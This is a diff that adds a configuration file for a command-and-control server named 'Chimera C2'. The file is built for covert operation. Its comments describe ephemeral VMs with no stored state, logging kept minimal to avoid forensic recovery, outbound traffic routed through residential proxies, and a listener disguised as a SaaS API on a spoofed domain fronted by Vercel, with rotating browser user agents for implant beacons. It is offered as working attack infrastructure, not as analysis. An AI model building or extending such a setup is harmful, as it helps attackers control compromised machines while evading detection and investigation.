@@ -1,0 +1,50 @@
+# sliver.toml — Auto-generated config for Chimera C2
+# This file is templated at runtime by entrypoint.sh using env vars
+# injected by the Fly provisioner (FlyProvisioner.provision_vm)
+
+# Server config
+[server]
+# Listen on all interfaces — Vercel reverse proxy handles TLS termination
+host = "0.0.0.0"
+port = 8443
+
+# Database — in-memory, no persistence (ephemeral VM, no state needed)
+# Each rotation cycle starts fresh; implants re-register on next beacon
+database = ""
+
+# Logging — minimal, no disk writes that could be forensically recovered
+log_level = "warn"
+log_path = ""
+
+# Implant config — generated per-cycle
+[implant]
+# Session key injected via SESSION_KEY env var (set by FlyProvisioner)
+# Used to authenticate incoming beacon connections
+session_key = "${SESSION_KEY}"
+
+# Egress — all outbound traffic routes through residential proxy
+# Configured by proxy-setup.sh using PROXY_URL env var
+[egress]
+proxy = "${PROXY_URL}"
+mode = "residential"
+
+# Listener — HTTP(S) profile disguised as a legit API
+[listener]
+type = "https"
+port = 8443
+domain = "api.cloudsync.dev"     # spoofed, never resolves — Vercel handles routing
+# TLS cert is self-signed but Vercel terminates TLS before it reaches here
+# so the implant never sees this cert — they see Vercel's Let's Encrypt cert
+cert = ""
+key = ""
+
+# Profile — make traffic look like a SaaS API
+[profile]
+name = "cloudsync"
+# Beacon interval and jitter set by implant, not server
+# User-agent rotation
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+]
